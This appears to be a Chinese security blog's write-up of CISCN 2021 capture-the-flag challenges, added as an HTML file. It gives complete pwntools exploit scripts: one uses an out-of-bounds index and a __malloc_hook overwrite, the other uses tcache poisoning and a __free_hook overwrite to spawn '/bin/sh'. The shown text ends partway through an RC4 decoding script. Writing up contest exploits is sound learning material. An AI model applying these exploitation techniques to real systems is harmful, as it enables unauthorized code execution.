@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/TRICK-LOGO.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/TRICK-LOGO.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/TRICK-LOGO.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"trick.ink","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CISCN_2021">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN_2021">
+<meta property="og:url" content="https://trick.ink/article/CISCN_2021/index.html">
+<meta property="og:site_name" content="Trick&#39;s Blog">
+<meta property="og:description" content="CISCN_2021">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210517194723531.png">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210517194740860.png">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210602204007319.png">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210602204021587.png">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210602204121951.png">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210517195700168.png">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210517195801362.png">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210602204143302.png">
+<meta property="og:image" content="https://trick.ink/.ink//image-20210602204433065.png">
+<meta property="article:published_time" content="2021-06-02T12:21:24.000Z">
+<meta property="article:modified_time" content="2021-07-24T06:35:41.734Z">
+<meta property="article:author" content="Trick">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://trick.ink/.ink//image-20210517194723531.png">
+
+<link rel="canonical" href="https://trick.ink/article/CISCN_2021/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CISCN_2021 | Trick's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Trick's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Trick's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://trick.ink/article/CISCN_2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/TRICK-LOGO.gif">
+      <meta itemprop="name" content="Trick">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trick's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN_2021
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-02 20:21:24" itemprop="dateCreated datePublished" datetime="2021-06-02T20:21:24+08:00">2021-06-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-24 14:35:41" itemprop="dateModified" datetime="2021-07-24T14:35:41+08:00">2021-07-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%AF%94%E8%B5%9BWriteUp/" itemprop="url" rel="index"><span itemprop="name">比赛WriteUp</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/CISCN_2021/" class="post-meta-item leancloud_visitors" data-flag-title="CISCN_2021" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CISCN-2021"><a href="#CISCN-2021" class="headerlink" title="CISCN_2021"></a>CISCN_2021</h1><span id="more"></span>
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h2><p>保护全开</p>
+<p><img src="/.ink//image-20210517194723531.png" alt="image-20210517194723531"></p>
+<p>IDA</p>
+<ul>
+<li>main</li>
+</ul>
+<p><img src="/.ink//image-20210517194740860.png" alt="image-20210517194740860"></p>
+<ul>
+<li>read</li>
+</ul>
+<p><img src="/.ink//image-20210602204007319.png" alt="image-20210602204007319"></p>
+<ul>
+<li>write</li>
+</ul>
+<p><img src="/.ink//image-20210602204021587.png" alt="image-20210602204021587"></p>
+<p>write 的时候可以数组越界，输入256，第一次读入到 0x202860 处使fd非法，第二次读入时写入0，这样即可做写入操作</p>
+<p><img src="/.ink//image-20210602204121951.png" alt="image-20210602204121951"></p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>利用数组溢出，实现任意地址读写。</p>
+<ul>
+<li>输入两次 0x100，数组越界，让 fd 置零</li>
+<li>leak libc </li>
+<li>当scanf读取长度超过0x400的数据时会调用 malloc_hook ，所以我们可以修改 malloc_hook 指向 realloc + n , realloc 指向 one_gadget</li>
+</ul>
+<h3 id="1、fd-置零"><a href="#1、fd-置零" class="headerlink" title="1、fd 置零"></a>1、fd 置零</h3><p>用vmmap 看 bss 段</p>
+<p>第二次read((unsigned __int8)random_fd, &amp;input, 8uLL)的时候fd是无效值，整个read是无效操作，input还是0，之后又赋值给了array[0x100]（即fd）</p>
+<p><img src="/.ink//image-20210517195700168.png" alt="image-20210517195700168"></p>
+<p><img src="/.ink//image-20210517195801362.png" alt="image-20210517195801362"></p>
+<h3 id="2、leak-libc"><a href="#2、leak-libc" class="headerlink" title="2、leak libc"></a>2、leak libc</h3><p><img src="/.ink//image-20210602204143302.png" alt="image-20210602204143302"></p>
+<p>0x202060 - 0x202040 = 0x20 = 32 ，32/8 = 4</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFFC</span>)) <span class="comment"># -4</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3、计算数组addr"><a href="#3、计算数组addr" class="headerlink" title="3、计算数组addr"></a>3、计算数组addr</h3><p><img src="/.ink//image-20210602204433065.png" alt="image-20210602204433065"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFF5</span>))<span class="comment"># -11</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4、修改hook"><a href="#4、修改hook" class="headerlink" title="4、修改hook"></a>4、修改hook</h3><p>修改 malloc_hook 指向 realloc + n , realloc 指向 one_gadget</p>
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./pwny&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29811</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946 12345</span></span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Index: &#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write2</span>(<span class="params">index,addr</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.send(addr)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x100</span>)</span><br><span class="line">write(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFFC</span>)) <span class="comment"># -4</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">stderr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = stderr - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:0x%x&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFF5</span>))<span class="comment"># -11</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">bss = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>,<span class="number">0xe546f</span>,<span class="number">0xe5617</span>,<span class="number">0xe561e</span>,<span class="number">0xe5622</span>,<span class="number">0x10a428</span>]</span><br><span class="line">one = one_gadget[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">offset1 = (libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - (bss + <span class="number">0x58</span> + <span class="number">8</span>))/<span class="number">8</span></span><br><span class="line">offset2 = (libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - (bss + <span class="number">0x58</span>))/<span class="number">8</span></span><br><span class="line">realloc_off = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">write2(offset2,p64(libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>] + realloc_off))</span><br><span class="line">write2(offset1,p64(one))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;5&#x27;</span> * <span class="number">0x400</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="longlywolf"><a href="#longlywolf" class="headerlink" title="longlywolf"></a>longlywolf</h2><p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;lonelywolf&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;124.71.230.240&quot;,&quot;26077&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;lonelywolf&quot;</span>).libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">data</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">edit(p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(p64(heap+<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment"># in tcache_head add chunk (without head)      </span></span><br><span class="line"></span><br><span class="line">edit(p64(<span class="number">0x0801010000000000</span>) + p64(<span class="number">0</span>)*<span class="number">12</span> + p64(heap+<span class="number">0x250</span>) + p64(heap+<span class="number">0x260</span>))</span><br><span class="line"><span class="comment"># 0x90 0x80 0x70</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x70 0x80</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#add chunk (without head)</span></span><br><span class="line"></span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#edit chunk size,and overlapping next chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment"># add a nobody chunk</span></span><br><span class="line"></span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># edit </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment"># tcache chunk_addr</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free()</span><br><span class="line"> </span><br><span class="line">edit(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;12345678&#x27;</span></span><br><span class="line">b=[]</span><br><span class="line">c=[<span class="number">0xa3</span>,<span class="number">0x1a</span>,<span class="number">0xe3</span>,<span class="number">0x69</span>,<span class="number">0x2f</span>,<span class="number">0xbb</span>,<span class="number">0x1a</span>,<span class="number">0x84</span>,<span class="number">0x65</span>,<span class="number">0xc2</span>,<span class="number">0xad</span>,<span class="number">0xad</span>,<span class="number">0x9e</span>,<span class="number">0x96</span>,<span class="number">0x5</span>,<span class="number">0x2</span>,<span class="number">0x1f</span>,<span class="number">0x8e</span>,<span class="number">0x36</span>,<span class="number">0x4f</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xaf</span>,<span class="number">0xf0</span>,<span class="number">0xea</span>,<span class="number">0xc4</span>,<span class="number">0xa8</span>,<span class="number">0x2d</span>,<span class="number">0x42</span>,<span class="number">0xc7</span>,<span class="number">0x6e</span>,<span class="number">0x3f</span>,<span class="number">0xb0</span>,<span class="number">0xd3</span>,<span class="number">0xcc</span>,<span class="number">0x78</span>,<span class="number">0xf9</span>,<span class="number">0x98</span>,<span class="number">0x3f</span>]</span><br><span class="line">d=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    b.append(i)</span><br><span class="line"></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    g=b[i]</span><br><span class="line">    n=(n+g+<span class="built_in">ord</span>(a[i%<span class="number">8</span>]))%<span class="number">256</span></span><br><span class="line">    b[i]=b[n]</span><br><span class="line">    b[n]=g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    